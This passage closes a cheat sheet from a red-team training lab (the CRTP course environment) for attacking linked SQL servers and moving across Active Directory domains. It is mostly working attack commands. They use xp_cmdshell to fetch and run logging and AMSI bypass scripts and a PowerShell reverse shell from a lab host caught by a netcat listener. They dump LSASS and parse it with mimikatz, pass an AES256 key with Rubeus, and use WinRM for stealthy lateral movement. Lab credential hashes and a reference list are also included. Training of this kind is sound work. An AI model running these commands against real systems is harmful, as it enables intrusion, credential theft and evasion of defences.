│    -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcpEx.ps1)"'''
│    -QueryTarget eu-sqlx                                                  │
│                                                                          │
│  # Listener                                                              │
│  C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443                        │
│                                                                          │
│  ── LSASS DUMP (OPSEC) ─────────────────────────────────────────────── │
│                                                                          │
│  # Copy mini.ps1 to eu-sqlx                                              │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql                            │
│    -Query 'exec master..xp_cmdshell ''xcopy \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\mini.ps1 C:\Users\Public'''
│    -QueryTarget eu-sqlx                                                  │
│                                                                          │
│  # Execute mini.ps1 → creates reverse.dmp on eu-sqlx                    │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql                            │
│    -Query 'exec master..xp_cmdshell ''powershell C:\Users\Public\mini.ps1'''
│    -QueryTarget eu-sqlx                                                  │
│                                                                          │
│  # Copy dmp file back                                                    │
│  Get-SQLServerLinkCrawl -Instance dcorp-mssql                            │
│    -Query 'exec master..xp_cmdshell ''xcopy C:\Users\Public\reverse.dmp \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\'''
│    -QueryTarget eu-sqlx                                                  │
│                                                                          │
│  # Reverse bytes on student VM                                           │
│  C:\AD\Tools\studentsharex\Reverse.exe                                   │
│    "C:\AD\Tools\studentsharex\reverse.dmp"                               │
│    "C:\AD\Tools\studentsharex\reversex.dmp"                              │
│                                                                          │
│  # Parse with mimikatz (elevated, Defender off)                          │
│  C:\AD\Tools\mimikatz.exe                                                │
│    "sekurlsa::minidump C:\AD\Tools\studentsharex\reversex.dmp"           │
│    "sekurlsa::ekeys" "exit"                                              │
│                                                                          │
│  ── LATERAL MOVEMENT ───────────────────────────────────────────────── │
│                                                                          │
│  # OPTH for dbadmin (eu.eurocorp.local)                                  │
│  Loader.exe -path Rubeus.exe -args asktgt                                │
│    /user:dbadmin                                                         │
│    /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
│    /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local                │
│    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt         │
│                                                                          │
│  # winrs (works, MDI detects)                                            │
│  winrs -r:eu-sqlx.eu.eurocorp.local cmd                                 │
│                                                                          │
│  # WSManWinRM.exe (ASR bypass, stealth)                                  │
│  C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local                   │
│    "cmd /c set username C:\Windows\ccmcache\"                           │
│                                                                          │
│  # With output redirect                                                  │
│  C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local                   │
│    "cmd /c dir >> \\dcorp-stdx.dollarcorp.moneycorp.local\studentsharex\out.txt C:\Windows\ccmcache\"
│                                                                          │
│  ── KEY VALUES ─────────────────────────────────────────────────────── │
│                                                                          │
│  Link chain : DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT → eu-sqlx          │
│  eu-sqlx SA : IsSysAdmin = 1 (sa login)                                 │
│  dbadmin aes256: ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
│  dbadmin rc4    : 0553b02b95f64f7a3c27b9029d105c27                      │
│  dbadmin domain : EU.EUROCORP.LOCAL                                     │
│  DC             : eu-dc.eu.eurocorp.local                               │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## References

- [GhostPack — PowerUpSQL on GitHub](https://github.com/NetSPI/PowerUpSQL)
- [NetSPI — Hacking SQL Server Linked Servers](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
- [minidumpdotnet on GitHub](https://github.com/xforcered/minidumpdotnet)
- [Microsoft Docs — xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [Microsoft Docs — ASR Rules Reference](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference)
- [Altered Security — CRTP Course](https://www.alteredsecurity.com/redteamlab)
